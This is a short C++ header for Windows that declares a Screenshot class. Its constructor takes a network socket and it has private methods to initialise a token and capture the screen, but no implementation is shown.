#pragma once
#include <windows.h>
#include <vector>
#include <gdiplus.h>
#include <gdiplusinit.h>
#include <atlimage.h>


#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "gdiplus.lib")


class Screenshot {

public:

	Screenshot(SOCKET sIncomingSocket);
	~Screenshot();

private:

	bool InitializeToken();
	bool TakeScreenshot();

};